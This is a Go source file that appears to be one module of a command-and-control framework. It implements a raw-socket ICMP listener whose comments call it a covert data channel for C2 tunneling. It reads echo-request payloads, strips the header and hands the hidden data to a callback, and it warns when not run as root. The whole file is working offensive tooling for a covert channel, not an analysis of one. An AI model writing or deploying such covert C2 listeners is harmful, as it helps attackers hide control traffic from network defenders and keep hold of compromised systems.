package listener

import (
	"log"
	"net"
	"os"
	"sync"
	"time"
)

// ICMPListener implements a raw ICMP echo listener for C2 tunneling.
// Uses ICMP echo request payloads as a covert data channel.
// Requires CAP_NET_RAW on Linux or Administrator on Windows.
type ICMPListener struct {
	OnData  Callback
	conn    *net.IPConn
	stopCh  chan struct{}
	wg      sync.WaitGroup
}

func NewICMPListener(cb Callback) *ICMPListener {
	return &ICMPListener{OnData: cb, stopCh: make(chan struct{})}
}

func (l *ICMPListener) Start() error {
	if os.Geteuid() != 0 {
		log.Printf("[listener/icmp] WARNING: not running as root — raw ICMP may fail")
	}

	raddr, err := net.ResolveIPAddr("ip4:icmp", "0.0.0.0")
	if err != nil {
		return err
	}

	conn, err := net.ListenIP("ip4:icmp", raddr)
	if err != nil {
		return err
	}
	l.conn = conn

	l.wg.Add(1)
	go l.readLoop()

	log.Printf("[listener/icmp] listening on raw ICMP (requires root/cap_net_raw)")
	return nil
}

func (l *ICMPListener) Stop() {
	close(l.stopCh)
	if l.conn != nil {
		l.conn.Close()
	}
	l.wg.Wait()
}

func (l *ICMPListener) readLoop() {
	defer l.wg.Done()

	buf := make([]byte, 1500)
	for {
		select {
		case <-l.stopCh:
			return
		default:
			l.conn.SetReadDeadline(time.Now().Add(2 * time.Second))
			n, addr, err := l.conn.ReadFrom(buf)
			if err != nil {
				if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
					continue
				}
				select {
				case <-l.stopCh:
					return
				default:
					log.Printf("[listener/icmp] read error: %v", err)
					continue
				}
			}

			if l.OnData != nil && n > 8 {
				// Skip ICMP header (8 bytes), pass payload to callback
				// Callback signature: func(transport string, data []byte) ([]byte, error)
				payload := buf[8:n]
				l.OnData("icmp", payload)
				log.Printf("[listener/icmp] %d bytes from %s", n, addr.String())
			}
		}
	}
}
